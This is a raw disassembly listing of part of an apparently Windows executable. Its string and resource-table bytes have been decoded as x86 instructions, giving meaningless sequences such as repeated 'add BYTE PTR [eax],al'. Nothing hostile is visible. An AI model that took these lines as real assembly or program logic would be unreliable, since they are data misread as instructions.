  4107fa:	cmp    DWORD PTR [ecx],edi
  4107fc:	add    BYTE PTR [eax+0x4e],dl
  4107ff:	xor    al,0x5f
  410801:	dec    esi
  410802:	inc    esp
  410803:	xor    DWORD PTR [edi],esi
  410805:	pop    edi
  410806:	cmp    DWORD PTR [ecx+0x41],edx
  410809:	add    BYTE PTR [edx+0x54],cl
  41080c:	xor    bl,BYTE PTR [edi+0x50]
  41080f:	push   ebx
  410810:	push   esi
  410811:	inc    esp
  410812:	pop    edi
  410813:	push   edx
  410814:	xor    BYTE PTR [ecx+0x0],bl
  410817:	push   esi
  410818:	inc    esp
  410819:	push   esp
  41081a:	pop    edi
  41081b:	dec    esp
  41081c:	xor    al,0x33
  41081e:	cmp    DWORD PTR [eax+eax*1+0x59],edx
  410822:	inc    edi
  410823:	inc    ebp
  410824:	pop    edi
  410825:	push   ebp
  410826:	pop    edx
  410827:	push   eax
  410828:	dec    edi
  410829:	pop    edi
  41082a:	push   esi
  41082b:	xor    BYTE PTR [eax],al
  41082d:	pop    eax
  41082e:	push   edi
  41082f:	push   esi
  410830:	cmp    BYTE PTR [edi+0x47],bl
  410833:	dec    ecx
  410834:	push   esp
  410835:	push   edx
  410836:	dec    ebx
  410837:	xor    BYTE PTR [edi+0x0],cl
  41083a:	dec    ecx
  41083b:	dec    esi
  41083c:	xor    eax,0x33345f30
  410841:	push   eax
  410842:	dec    edx
  410843:	cmp    BYTE PTR [eax],al
  410845:	pop    eax
  410846:	inc    ecx
  410847:	dec    esi
  410848:	pop    edi
  410849:	inc    edx
  41084a:	push   ebp
  41084b:	push   ecx
  41084c:	pop    edi
  41084d:	inc    ecx
  41084e:	add    BYTE PTR [edi+0x58],al
  410851:	xor    BYTE PTR [edi+0x4c],bl
  410854:	dec    ebp
  410855:	cmp    DWORD PTR [ebp+0x5f],edx
  410858:	push   esp
  410859:	push   edx
  41085a:	add    BYTE PTR [eax+0x38],cl
  41085d:	dec    edi
  41085e:	xor    eax,0x594b535f
  410863:	xor    BYTE PTR [ebp+0x0],cl
  410866:	inc    ecx
  410867:	dec    eax
  410868:	xor    DWORD PTR [edi+0x4e],ebx
  41086b:	ss inc esp
  41086d:	dec    eax
  41086e:	cmp    DWORD PTR [eax],eax
  410870:	push   esi
  410871:	push   esp
  410872:	aaa    
  410873:	xor    bh,BYTE PTR [ecx]
  410875:	xor    al,0x31
  410877:	pop    edi
  410878:	push   edx
  410879:	push   edi
  41087a:	push   edx
  41087b:	dec    ecx
  41087c:	pop    edi
  41087d:	inc    esp
  41087e:	add    BYTE PTR [edi+0x52],dl
  410881:	pop    ecx
  410882:	xor    eax,0x5045395f
  410887:	pop    edi
  410888:	xor    eax,DWORD PTR [eax]
  41088a:	inc    ebp
  41088b:	xor    dl,BYTE PTR [ebx+0x39]
  41088e:	xor    dh,BYTE PTR [esi]
  410890:	xor    eax,0x4900525f
  410895:	push   esp
  410896:	xor    bl,BYTE PTR [edi+0x41]
  410899:	dec    edx
  41089a:	xor    eax,0x4c3737
  41089f:	push   ecx
  4108a0:	add    BYTE PTR [edi+0x0],al
  4108a3:	pop    ecx
  4108a4:	add    BYTE PTR [edi+0x0],bl
  4108a7:	push   ebx
  4108a8:	add    BYTE PTR [ebx+0x0],al
  4108ab:	xor    al,BYTE PTR [eax]
  4108ad:	pop    edx
  4108ae:	add    BYTE PTR [edi+0x0],dl
  4108b1:	add    BYTE PTR [eax],al
  4108b3:	push   edx
  4108b4:	add    BYTE PTR [eax+eax*1+0x4d],dl
  4108b8:	add    BYTE PTR [edi+0x0],bl
  4108bb:	dec    eax
  4108bc:	add    BYTE PTR [ebx+0x0],cl
  4108bf:	xor    DWORD PTR [eax],eax
  4108c1:	pop    edi
  4108c2:	add    BYTE PTR [ecx+0x0],al
  4108c5:	push   ebp
  4108c6:	add    BYTE PTR [ecx],bh
  4108c8:	add    BYTE PTR [esi+0x0],dl
  4108cb:	xor    al,BYTE PTR [eax]
  4108cd:	pop    edi
  4108ce:	add    BYTE PTR [edx],dh
  4108d0:	add    BYTE PTR [eax],al
  4108d2:	add    BYTE PTR [ecx+0x0],dl
  4108d5:	xor    al,0x0
  4108d7:	inc    edx
  4108d8:	add    BYTE PTR [edi+0x0],bl
  4108db:	inc    esp
  4108dc:	add    BYTE PTR [esi+0x0],dl
  4108df:	xor    eax,0x5f005500
  4108e4:	add    BYTE PTR [ebx+0x0],al
  4108e7:	inc    ebx
  4108e8:	add    BYTE PTR [eax],al
  4108ea:	add    BYTE PTR [eax+0x0],cl
  4108ed:	inc    edx
  4108ee:	add    BYTE PTR [ecx+0x0],dl
  4108f1:	pop    edi
  4108f2:	add    BYTE PTR [eax+eax*1+0x38],dl
  4108f6:	add    BYTE PTR [eax+0x0],dl
  4108f9:	push   edx
  4108fa:	add    BYTE PTR [ecx+0x0],cl
  4108fd:	pop    edi
  4108fe:	add    BYTE PTR [ebp+0x0],al
  410901:	dec    ebp
  410902:	add    BYTE PTR [ebp+0x0],dl
  410905:	add    BYTE PTR [eax],al
  410907:	inc    edi
  410908:	add    BYTE PTR [edi+0x0],cl
  41090b:	xor    eax,0x32005f00
  410910:	add    BYTE PTR [ebx+0x0],dl
  410913:	inc    ebp
  410914:	add    BYTE PTR [ecx],bh
  410916:	add    BYTE PTR [esi],dh
  410918:	add    BYTE PTR [edi+0x0],bl
  41091b:	pop    eax
  41091c:	add    BYTE PTR [edx+0x0],bl
  41091f:	xor    al,0x0
  410921:	pop    edi
  410922:	add    BYTE PTR [edi+0x0],cl
  410925:	add    BYTE PTR [eax],al
  410927:	push   ebx
  410928:	add    BYTE PTR [eax],dh
  41092a:	add    BYTE PTR [ecx+0x0],dl
  41092d:	pop    edi
  41092e:	add    BYTE PTR [ebp+0x0],dl
  410931:	dec    ecx
  410932:	add    BYTE PTR [ecx+0x0],bl
  410935:	xor    al,BYTE PTR [eax]
  410937:	add    BYTE PTR [eax],al
  410939:	dec    eax
  41093a:	add    BYTE PTR [edi],dh
  41093c:	add    BYTE PTR [ecx+0x0],bl
  41093f:	aaa    
  410940:	add    BYTE PTR [edi+0x0],bl
  410943:	inc    esi
  410944:	add    BYTE PTR [edi],dh
  410946:	add    BYTE PTR [ecx+0x0],bl
  410949:	inc    esp
  41094a:	add    BYTE PTR [edi+0x0],bl
  41094d:	xor    eax,0x52000000
  410952:	add    BYTE PTR [eax+0x0],dl
  410955:	inc    esi
  410956:	add    BYTE PTR [edi+0x0],bl
  410959:	dec    esp
  41095a:	add    BYTE PTR [ecx+0x0],al
  41095d:	push   eax
  41095e:	add    BYTE PTR [edi+0x0],bl
  410961:	inc    ecx
  410962:	add    BYTE PTR [edi],dh
  410964:	add    BYTE PTR [eax+eax*1+0x4a],al
  410968:	add    BYTE PTR [ebp+0x0],al
  41096b:	pop    edi
  41096c:	add    BYTE PTR [eax+eax*1],dh
  41096f:	add    BYTE PTR [eax],al
  410971:	dec    esp
  410972:	add    BYTE PTR [edi],dh
  410974:	add    BYTE PTR [ebp+0x0],cl
  410977:	cmp    BYTE PTR [eax],al
  410979:	xor    al,BYTE PTR [eax]
  41097b:	pop    edi
  41097c:	add    BYTE PTR [eax],bh
  41097e:	add    BYTE PTR [ecx+0x0],al
  410981:	pop    edx
  410982:	add    BYTE PTR [edx+0x0],bl
  410985:	pop    edi
  410986:	add    BYTE PTR [ebx],dh
  410988:	add    BYTE PTR [ebx+0x0],dl
  41098b:	add    BYTE PTR [eax],al
  41098d:	push   esi
  41098e:	add    BYTE PTR [eax],bh
  410990:	add    BYTE PTR [esi+0x0],dl
  410993:	xor    al,BYTE PTR [eax]
  410995:	pop    edi
  410996:	add    BYTE PTR [esi+0x0],al
  410999:	inc    ebx
  41099a:	add    BYTE PTR [edi+0x0],al
  41099d:	push   edi
  41099e:	add    BYTE PTR [edi+0x0],bl
  4109a1:	dec    eax
  4109a2:	add    BYTE PTR [edx+0x0],cl
  4109a5:	cmp    DWORD PTR [eax],eax
  4109a7:	aaa    
  4109a8:	add    BYTE PTR [eax],al
  4109aa:	add    BYTE PTR [ecx+0x0],cl
  4109ad:	dec    edx
  4109ae:	add    BYTE PTR [ecx+0x0],al
  4109b1:	pop    edi
  4109b2:	add    BYTE PTR [edx+0x0],cl
  4109b5:	inc    esi
  4109b6:	add    BYTE PTR [edi+0x0],dl
  4109b9:	xor    eax,DWORD PTR [eax]
  4109bb:	dec    ebp
  4109bc:	add    BYTE PTR [edi+0x0],bl
  4109bf:	push   eax
  4109c0:	add    BYTE PTR [ecx+0x0],al
  4109c3:	add    BYTE PTR [eax],al
  4109c5:	dec    edi
  4109c6:	add    BYTE PTR [ecx+0x0],bl
  4109c9:	dec    eax
  4109ca:	add    BYTE PTR [edi+0x0],bl
  4109cd:	xor    eax,0x0
	...
  4109da:	add    al,0x0
  4109dc:	add    BYTE PTR [eax],al
  4109de:	or     al,0x0
  4109e0:	add    BYTE PTR [eax],al
  4109e2:	rol    BYTE PTR [esi],1
  4109e4:	add    BYTE PTR [eax-0x7fffff90],al
  4109ea:	or     al,BYTE PTR [edi]
  4109ec:	add    BYTE PTR [eax-0x7fffff70],al
  4109f2:	xor    al,0x7
  4109f4:	add    BYTE PTR [eax-0x7fffff58],al
  4109fa:	pusha  
  4109fb:	pop    es
  4109fc:	add    BYTE PTR [eax-0x7fffff40],al
  410a02:	loopne 0x410a0b
  410a04:	add    BYTE PTR [eax-0x7fffff08],al
  410a0a:	adc    BYTE PTR [eax],cl
  410a0c:	add    BYTE PTR [eax-0x7ffffee0],al
  410a12:	sub    BYTE PTR [eax],cl
  410a14:	add    BYTE PTR [eax-0x7ffffec8],al
  410a1a:	pop    eax
  410a1b:	or     BYTE PTR [eax],al
  410a1d:	adc    BYTE PTR [eax+0x1],0x0
  410a21:	cmp    BYTE PTR [edx-0x7f7ffff8],0x1
  410a28:	add    BYTE PTR [eax-0x7ffff714],al
  410a2e:	mov    al,ds:0xa800001
  410a33:	or     DWORD PTR [eax],eax
  410a35:	adc    al,0x1
  410a38:	add    BYTE PTR [eax-0x7ffff6dc],al
  410a3e:	lock add DWORD PTR [eax],eax
  410a41:	add    BYTE PTR [eax],0x0
  410a44:	add    BYTE PTR [eax],al
  410a46:	add    BYTE PTR [eax],al
  410a48:	add    BYTE PTR [eax],al
  410a4a:	add    al,0x0
  410a4c:	add    BYTE PTR [eax],al
  410a4e:	add    DWORD PTR [eax],eax
  410a50:	add    DWORD PTR [eax],eax
  410a52:	in     al,dx
  410a53:	push   es
  410a54:	add    BYTE PTR [eax-0x7ffffde0],al
  410a5a:	in     eax,dx
  410a5b:	push   0x0
  410a5d:	add    BYTE PTR [eax],bh
  410a5f:	add    al,BYTE PTR [eax]
  410a61:	add    BYTE PTR [eax],0x0
  410a64:	add    BYTE PTR [eax],al
  410a66:	add    BYTE PTR [eax],al
  410a68:	add    BYTE PTR [eax],al
  410a6a:	add    al,0x0
  410a6c:	add    BYTE PTR [eax],al
  410a6e:	add    DWORD PTR [eax],eax
  410a70:	add    BYTE PTR [eax],al
  410a72:	sbb    al,0x7
  410a74:	add    BYTE PTR [eax-0x7ffffdb0],al
	...
  410a82:	add    al,0x0
  410a84:	add    BYTE PTR [eax],al
  410a86:	add    DWORD PTR [eax],eax
  410a88:	add    BYTE PTR [eax],al
  410a8a:	dec    esi
  410a8b:	pop    es
  410a8c:	add    BYTE PTR [eax-0x7ffffd98],al
	...
  410a9a:	add    al,0x0
  410a9c:	add    BYTE PTR [eax],al
  410a9e:	add    eax,0x72000000
  410aa3:	pop    es
  410aa4:	add    BYTE PTR [eax-0x7ffffd80],al
  410aaa:	test   BYTE PTR [edi],al
  410aac:	add    BYTE PTR [eax-0x7ffffd68],al
  410ab2:	call   0x2:0xb0800007
  410ab9:	xor    BYTE PTR [edx-0x377ffff9],0x2
  410ac0:	add    BYTE PTR [eax-0x7ffff834],al
  410ac6:	loopne 0x410aca
  410ac8:	add    BYTE PTR [eax+0x0],al
  410ace:	add    BYTE PTR [eax],al
  410ad0:	add    BYTE PTR [eax],al
  410ad2:	add    al,0x0
  410ad4:	add    BYTE PTR [eax],al
  410ad6:	add    DWORD PTR [eax],eax
  410ad8:	add    al,BYTE PTR [eax]
  410ada:	inc    BYTE PTR [edi]
  410adc:	add    BYTE PTR [eax-0x7ffffd08],al
  410ae2:	ins    BYTE PTR es:[edi],dx
  410ae3:	adc    DWORD PTR [eax],eax
  410ae5:	add    BYTE PTR [eax],dl
  410ae7:	add    eax,DWORD PTR [eax]
  410ae9:	sub    BYTE PTR [ebp+0x28000024],0x3
  410af0:	add    BYTE PTR [eax+0x0],al
  410af6:	add    BYTE PTR [eax],al
  410af8:	add    BYTE PTR [eax],al
  410afa:	add    al,0x0
  410afc:	add    BYTE PTR [eax],al
  410afe:	add    BYTE PTR [eax],al
  410b00:	add    DWORD PTR [eax],eax
  410b02:	mov    esp,0x40000047
  410b07:	add    eax,DWORD PTR [eax]
  410b09:	add    BYTE PTR [eax],0x0
  410b0c:	add    BYTE PTR [eax],al
  410b0e:	add    BYTE PTR [eax],al
  410b10:	add    BYTE PTR [eax],al
  410b12:	add    al,0x0
  410b14:	add    BYTE PTR [eax],al
  410b16:	add    DWORD PTR [eax],eax
  410b18:	add    BYTE PTR [eax],al
  410b1a:	inc    esp
  410b1b:	or     BYTE PTR [eax],al
  410b1d:	sbb    BYTE PTR [eax+0x3],0x0
  410b21:	add    BYTE PTR [eax],0x0
  410b24:	add    BYTE PTR [eax],al
  410b26:	add    BYTE PTR [eax],al
  410b28:	add    BYTE PTR [eax],al
  410b2a:	add    al,0x0
  410b2c:	add    BYTE PTR [eax],al
  410b2e:	add    eax,DWORD PTR [eax]
  410b30:	add    DWORD PTR [eax],eax
  410b32:	outs   dx,BYTE PTR ds:[esi]
  410b33:	or     BYTE PTR [eax],al
  410b35:	xor    BYTE PTR [eax+0x3],0x0
  410b39:	add    BYTE PTR [eax+ecx*1+0x3888000],0x0
  410b41:	sbb    BYTE PTR [eax+ecx*1+0x3a08000],0x0
  410b49:	cmp    BYTE PTR [esi],0x75
  410b4c:	add    BYTE PTR [eax],al
  410b4e:	mov    eax,0x800003
  410b53:	add    BYTE PTR [eax],al
  410b55:	add    BYTE PTR [eax],al
  410b57:	add    BYTE PTR [eax],al
  410b59:	add    BYTE PTR [eax+eax*1],al
  410b5c:	add    BYTE PTR [eax],al
  410b5e:	add    DWORD PTR [eax],eax
  410b60:	add    DWORD PTR [eax],eax
  410b62:	ror    BYTE PTR [eax],cl
  410b64:	add    BYTE PTR [eax-0x7ffffc30],al
  410b6a:	jae    0x410bd0
  410b6c:	add    BYTE PTR [eax],al
  410b6e:	call   0xc10b76
  410b73:	add    BYTE PTR [eax],al
  410b75:	add    BYTE PTR [eax],al
  410b77:	add    BYTE PTR [eax],al
  410b79:	add    BYTE PTR [eax+eax*1],al
  410b7c:	add    BYTE PTR [eax],al
  410b7e:	add    BYTE PTR [eax],al
  410b80:	add    al,0x0
  410b82:	jmp    0x410b9e
  410b84:	add    BYTE PTR [eax],al
  410b86:	add    BYTE PTR [eax+eax*1],al
  410b89:	add    ch,0x3a
  410b8c:	add    BYTE PTR [eax],al
  410b8e:	sbb    BYTE PTR [eax+eax*1],al
  410b91:	sub    BYTE PTR [ebx+0x30000040],0x4
  410b98:	add    BYTE PTR [eax+0x4b9e],al
  410b9e:	dec    eax
  410b9f:	add    al,0x0
  410ba1:	add    BYTE PTR [eax],0x0
  410ba4:	add    BYTE PTR [eax],al
  410ba6:	add    BYTE PTR [eax],al
  410ba8:	add    BYTE PTR [eax],al
  410baa:	add    al,0x0
  410bac:	add    BYTE PTR [eax],al
  410bae:	add    BYTE PTR [eax],al
  410bb0:	add    al,BYTE PTR [eax]
  410bb2:	repz and al,0x0
  410bb5:	add    BYTE PTR [eax+0x4],ah
  410bb8:	add    BYTE PTR [eax+0x2ca1],al
  410bbe:	js     0x410bc4
  410bc0:	add    BYTE PTR [eax+0x0],al
  410bc6:	add    BYTE PTR [eax],al
  410bc8:	add    BYTE PTR [eax],al
  410bca:	add    al,0x0
  410bcc:	add    BYTE PTR [eax],al
  410bce:	add    DWORD PTR [eax],eax
  410bd0:	add    eax,DWORD PTR [eax]
  410bd2:	or     DWORD PTR ss:[eax],eax
  410bd5:	adc    BYTE PTR [eax-0xa7ffffc],0xf
  410bdc:	add    BYTE PTR [eax],al
  410bde:	test   al,0x4
  410be0:	add    BYTE PTR [eax+0x1e90],al
  410be6:	rol    BYTE PTR [eax+eax*1],0x80
  410bea:	bound  esp,QWORD PTR [edi]
  410bec:	add    BYTE PTR [eax],al
  410bee:	fadd   DWORD PTR [eax+eax*1]
  410bf1:	add    BYTE PTR [eax],0x0
  410bf4:	add    BYTE PTR [eax],al
  410bf6:	add    BYTE PTR [eax],al
  410bf8:	add    BYTE PTR [eax],al
  410bfa:	add    al,0x0
  410bfc:	add    BYTE PTR [eax],al
  410bfe:	add    BYTE PTR [eax],al
  410c00:	add    DWORD PTR [eax],eax
  410c02:	or     DWORD PTR [eax+eax*1],eax
  410c05:	add    al,dh
  410c07:	add    al,0x0
	...
  410c11:	add    BYTE PTR [eax+eax*1],al
  410c14:	add    BYTE PTR [eax],al
  410c16:	add    BYTE PTR [eax],al
  410c18:	add    DWORD PTR [eax],eax
  410c1a:	or     DWORD PTR [eax+eax*1],eax
  410c1d:	add    BYTE PTR [eax],al
  410c1f:	add    eax,0x0
  410c24:	add    BYTE PTR [eax],al
  410c26:	add    BYTE PTR [eax],al
  410c28:	add    BYTE PTR [eax],al
  410c2a:	add    al,0x0
  410c2c:	add    BYTE PTR [eax],al
  410c2e:	add    BYTE PTR [eax],al
  410c30:	add    DWORD PTR [eax],eax
  410c32:	or     DWORD PTR [eax+eax*1],eax
  410c35:	add    BYTE PTR [eax],dl
  410c37:	add    eax,0x0
  410c3c:	add    BYTE PTR [eax],al
  410c3e:	add    BYTE PTR [eax],al
  410c40:	add    BYTE PTR [eax],al
  410c42:	add    al,0x0
  410c44:	add    BYTE PTR [eax],al
  410c46:	add    BYTE PTR [eax],al
  410c48:	add    DWORD PTR [eax],eax
  410c4a:	or     DWORD PTR [eax+eax*1],eax
  410c4d:	add    BYTE PTR [eax],ah
  410c4f:	add    eax,0x0
  410c54:	add    BYTE PTR [eax],al
  410c56:	add    BYTE PTR [eax],al
  410c58:	add    BYTE PTR [eax],al
  410c5a:	add    al,0x0
  410c5c:	add    BYTE PTR [eax],al
  410c5e:	add    BYTE PTR [eax],al
  410c60:	add    DWORD PTR [eax],eax
  410c62:	or     DWORD PTR [eax+eax*1],eax
  410c65:	add    BYTE PTR [eax],dh
  410c67:	add    eax,0x0
  410c6c:	add    BYTE PTR [eax],al
  410c6e:	add    BYTE PTR [eax],al
  410c70:	add    BYTE PTR [eax],al
  410c72:	add    al,0x0
  410c74:	add    BYTE PTR [eax],al
  410c76:	add    BYTE PTR [eax],al
  410c78:	add    DWORD PTR [eax],eax
  410c7a:	or     DWORD PTR [eax+eax*1],eax
  410c7d:	add    BYTE PTR [eax+0x5],al
	...
  410c88:	add    BYTE PTR [eax],al
  410c8a:	add    al,0x0
  410c8c:	add    BYTE PTR [eax],al
  410c8e:	add    BYTE PTR [eax],al
  410c90:	add    DWORD PTR [eax],eax
  410c92:	or     DWORD PTR [eax+eax*1],eax
  410c95:	add    BYTE PTR [eax+0x5],dl
	...
  410ca0:	add    BYTE PTR [eax],al
  410ca2:	add    al,0x0
  410ca4:	add    BYTE PTR [eax],al
  410ca6:	add    BYTE PTR [eax],al
  410ca8:	add    DWORD PTR [eax],eax
  410caa:	or     DWORD PTR [eax+eax*1],eax
  410cad:	add    BYTE PTR [eax+0x5],ah
	...
  410cb8:	add    BYTE PTR [eax],al
  410cba:	add    al,0x0
  410cbc:	add    BYTE PTR [eax],al
  410cbe:	add    BYTE PTR [eax],al
  410cc0:	add    DWORD PTR [eax],eax
  410cc2:	or     DWORD PTR [eax+eax*1],eax
  410cc5:	add    BYTE PTR [eax+0x5],dh
	...
  410cd0:	add    BYTE PTR [eax],al
  410cd2:	add    al,0x0
  410cd4:	add    BYTE PTR [eax],al
  410cd6:	add    BYTE PTR [eax],al
  410cd8:	add    DWORD PTR [eax],eax
  410cda:	or     DWORD PTR [eax+eax*1],eax
  410cdd:	add    BYTE PTR [eax+0x5],al
  410ce3:	add    BYTE PTR [eax],al
  410ce5:	add    BYTE PTR [eax],al
  410ce7:	add    BYTE PTR [eax],al
  410ce9:	add    BYTE PTR [eax+eax*1],al
  410cec:	add    BYTE PTR [eax],al
  410cee:	add    BYTE PTR [eax],al
  410cf0:	add    DWORD PTR [eax],eax
  410cf2:	or     DWORD PTR [eax+eax*1],eax
  410cf5:	add    BYTE PTR [eax+0x5],dl
  410cfb:	add    BYTE PTR [eax],al
  410cfd:	add    BYTE PTR [eax],al
  410cff:	add    BYTE PTR [eax],al
  410d01:	add    BYTE PTR [eax+eax*1],al
  410d04:	add    BYTE PTR [eax],al
  410d06:	add    BYTE PTR [eax],al
  410d08:	add    DWORD PTR [eax],eax
  410d0a:	or     DWORD PTR [eax+eax*1],eax
  410d0d:	add    BYTE PTR [eax+0x5],ah
  410d13:	add    BYTE PTR [eax],al
  410d15:	add    BYTE PTR [eax],al
  410d17:	add    BYTE PTR [eax],al
  410d19:	add    BYTE PTR [eax+eax*1],al
  410d1c:	add    BYTE PTR [eax],al
  410d1e:	add    BYTE PTR [eax],al
  410d20:	add    DWORD PTR [eax],eax
  410d22:	or     DWORD PTR [eax+eax*1],eax
  410d25:	add    BYTE PTR [eax+0x5],dh
  410d2b:	add    BYTE PTR [eax],al
  410d2d:	add    BYTE PTR [eax],al
  410d2f:	add    BYTE PTR [eax],al
  410d31:	add    BYTE PTR [eax+eax*1],al
  410d34:	add    BYTE PTR [eax],al
  410d36:	add    BYTE PTR [eax],al
  410d38:	add    DWORD PTR [eax],eax
  410d3a:	or     DWORD PTR [eax+eax*1],eax
  410d3d:	add    al,al
  410d3f:	add    eax,0x0
  410d44:	add    BYTE PTR [eax],al
  410d46:	add    BYTE PTR [eax],al
  410d48:	add    BYTE PTR [eax],al
  410d4a:	add    al,0x0
  410d4c:	add    BYTE PTR [eax],al
  410d4e:	add    BYTE PTR [eax],al
  410d50:	add    DWORD PTR [eax],eax
  410d52:	or     DWORD PTR [eax+eax*1],eax
  410d55:	add    al,dl
  410d57:	add    eax,0x0
  410d5c:	add    BYTE PTR [eax],al
  410d5e:	add    BYTE PTR [eax],al
  410d60:	add    BYTE PTR [eax],al
  410d62:	add    al,0x0
  410d64:	add    BYTE PTR [eax],al
  410d66:	add    BYTE PTR [eax],al
  410d68:	add    DWORD PTR [eax],eax
  410d6a:	or     DWORD PTR [eax+eax*1],eax
  410d6d:	add    al,ah
  410d6f:	add    eax,0x0
  410d74:	add    BYTE PTR [eax],al
  410d76:	add    BYTE PTR [eax],al
  410d78:	add    BYTE PTR [eax],al
  410d7a:	add    al,0x0
  410d7c:	add    BYTE PTR [eax],al
  410d7e:	add    BYTE PTR [eax],al
  410d80:	add    DWORD PTR [eax],eax
  410d82:	or     DWORD PTR [eax+eax*1],eax
  410d85:	add    al,dh
  410d87:	add    eax,0x0
  410d8c:	add    BYTE PTR [eax],al
  410d8e:	add    BYTE PTR [eax],al
  410d90:	add    BYTE PTR [eax],al
  410d92:	add    al,0x0
  410d94:	add    BYTE PTR [eax],al
  410d96:	add    BYTE PTR [eax],al
  410d98:	add    DWORD PTR [eax],eax
  410d9a:	or     DWORD PTR [eax+eax*1],eax
  410d9d:	add    BYTE PTR [eax],al
  410d9f:	push   es
	...
  410da8:	add    BYTE PTR [eax],al
  410daa:	add    al,0x0
  410dac:	add    BYTE PTR [eax],al
  410dae:	add    BYTE PTR [eax],al
  410db0:	add    DWORD PTR [eax],eax
  410db2:	or     DWORD PTR [eax+eax*1],eax
  410db5:	add    BYTE PTR [eax],dl
  410db7:	push   es
	...
  410dc0:	add    BYTE PTR [eax],al
  410dc2:	add    al,0x0
  410dc4:	add    BYTE PTR [eax],al
  410dc6:	add    BYTE PTR [eax],al
  410dc8:	add    DWORD PTR [eax],eax
  410dca:	or     DWORD PTR [eax+eax*1],eax
  410dcd:	add    BYTE PTR [eax],ah
  410dcf:	push   es
	...
  410dd8:	add    BYTE PTR [eax],al
  410dda:	add    al,0x0
  410ddc:	add    BYTE PTR [eax],al
  410dde:	add    BYTE PTR [eax],al
  410de0:	add    DWORD PTR [eax],eax
  410de2:	or     DWORD PTR [eax+eax*1],eax
  410de5:	add    BYTE PTR [eax],dh
  410de7:	push   es
	...
  410df0:	add    BYTE PTR [eax],al
  410df2:	add    al,0x0
  410df4:	add    BYTE PTR [eax],al
  410df6:	add    BYTE PTR [eax],al
  410df8:	add    DWORD PTR [eax],eax
  410dfa:	or     DWORD PTR [eax+eax*1],eax
  410dfd:	add    BYTE PTR [eax+0x6],al
	...
  410e08:	add    BYTE PTR [eax],al
  410e0a:	add    al,0x0
  410e0c:	add    BYTE PTR [eax],al
  410e0e:	add    BYTE PTR [eax],al
  410e10:	add    DWORD PTR [eax],eax
  410e12:	or     DWORD PTR [eax+eax*1],eax
  410e15:	add    BYTE PTR [eax+0x6],dl
	...
  410e20:	add    BYTE PTR [eax],al
  410e22:	add    al,0x0
  410e24:	add    BYTE PTR [eax],al
  410e26:	add    BYTE PTR [eax],al
  410e28:	add    DWORD PTR [eax],eax
  410e2a:	or     DWORD PTR [eax+eax*1],eax
  410e2d:	add    BYTE PTR [eax+0x6],ah
	...
  410e38:	add    BYTE PTR [eax],al
  410e3a:	add    al,0x0
  410e3c:	add    BYTE PTR [eax],al
  410e3e:	add    BYTE PTR [eax],al
  410e40:	add    DWORD PTR [eax],eax
  410e42:	or     DWORD PTR [eax+eax*1],eax
  410e45:	add    BYTE PTR [eax+0x6],dh
	...
  410e50:	add    BYTE PTR [eax],al
  410e52:	add    al,0x0
  410e54:	add    BYTE PTR [eax],al
  410e56:	add    BYTE PTR [eax],al
  410e58:	add    DWORD PTR [eax],eax
  410e5a:	or     DWORD PTR [eax+eax*1],eax
  410e5d:	add    BYTE PTR [eax+0x6],al
  410e63:	add    BYTE PTR [eax],al
  410e65:	add    BYTE PTR [eax],al
  410e67:	add    BYTE PTR [eax],al
  410e69:	add    BYTE PTR [eax+eax*1],al
  410e6c:	add    BYTE PTR [eax],al
  410e6e:	add    BYTE PTR [eax],al
  410e70:	add    DWORD PTR [eax],eax
  410e72:	or     DWORD PTR [eax+eax*1],eax
  410e75:	add    BYTE PTR [eax+0x6],dl
  410e7b:	add    BYTE PTR [eax],al
  410e7d:	add    BYTE PTR [eax],al
  410e7f:	add    BYTE PTR [eax],al
  410e81:	add    BYTE PTR [eax+eax*1],al
  410e84:	add    BYTE PTR [eax],al
  410e86:	add    BYTE PTR [eax],al
  410e88:	add    DWORD PTR [eax],eax
  410e8a:	or     DWORD PTR [eax+eax*1],eax
  410e8d:	add    BYTE PTR [eax+0x6],ah
  410e93:	add    BYTE PTR [eax],al
  410e95:	add    BYTE PTR [eax],al
  410e97:	add    BYTE PTR [eax],al
  410e99:	add    BYTE PTR [eax+eax*1],al
  410e9c:	add    BYTE PTR [eax],al
  410e9e:	add    BYTE PTR [eax],al
  410ea0:	add    DWORD PTR [eax],eax
  410ea2:	or     DWORD PTR [eax+eax*1],eax
  410ea5:	add    BYTE PTR [eax+0x6],dh
  410eab:	add    BYTE PTR [eax],al
  410ead:	add    BYTE PTR [eax],al
  410eaf:	add    BYTE PTR [eax],al
  410eb1:	add    BYTE PTR [eax+eax*1],al
  410eb4:	add    BYTE PTR [eax],al
  410eb6:	add    BYTE PTR [eax],al
  410eb8:	add    DWORD PTR [eax],eax
  410eba:	or     DWORD PTR [eax+eax*1],eax
  410ebd:	add    al,al
  410ebf:	push   es
  410ec0:	add    BYTE PTR [eax],al
  410ec2:	xor    dl,BYTE PTR [ebx]
  410ec4:	add    DWORD PTR [eax],eax
  410ec6:	or     eax,0xe4000009
  410ecb:	add    al,0x0
  410ecd:	add    BYTE PTR [eax],al
  410ecf:	add    BYTE PTR [eax],al
  410ed1:	add    BYTE PTR [edi],bh
  410ed3:	sbb    al,0x1
  410ed5:	add    BYTE PTR ds:0xe4000009,dl
  410edb:	add    al,0x0
  410edd:	add    BYTE PTR [eax],al
  410edf:	add    BYTE PTR [eax],al
  410ee1:	add    BYTE PTR [ebp+eiz*1+0x1],dl
  410ee5:	add    BYTE PTR ds:0xe4000009,dl
  410eeb:	add    al,0x0
  410eed:	add    BYTE PTR [eax],al
  410eef:	add    BYTE PTR [eax],al
  410ef1:	add    BYTE PTR [ecx+0x2e],ch
  410ef4:	add    DWORD PTR [eax],eax
  410ef6:	repz or BYTE PTR [eax],al
  410ef9:	add    ah,ah
  410efb:	add    al,0x0
  410efd:	add    BYTE PTR [eax],al
  410eff:	add    BYTE PTR [eax],al
  410f01:	add    BYTE PTR [edi+esi*1+0x1],bl
  410f05:	add    BYTE PTR [ecx],dl
  410f07:	or     DWORD PTR [eax],eax
  410f09:	add    ah,ah
  410f0b:	add    al,0x0
  410f0d:	add    BYTE PTR [eax],al
  410f0f:	add    BYTE PTR [eax],al
  410f11:	add    BYTE PTR [ebp+0x40],ch
  410f14:	add    DWORD PTR [eax],eax
  410f16:	adc    DWORD PTR [ecx],ecx
  410f18:	add    BYTE PTR [eax],al
  410f1a:	in     al,0x4
  410f1c:	add    BYTE PTR [eax],al
  410f1e:	add    BYTE PTR [eax],al
  410f20:	add    BYTE PTR [eax],al
  410f22:	jle    0x410f6d
  410f24:	add    DWORD PTR [eax],eax
  410f26:	adc    eax,0xe4000009
  410f2b:	add    al,0x0
  410f2d:	add    BYTE PTR [eax],al
  410f2f:	add    BYTE PTR [eax],al
  410f31:	add    BYTE PTR [ebx+0x19000152],dl
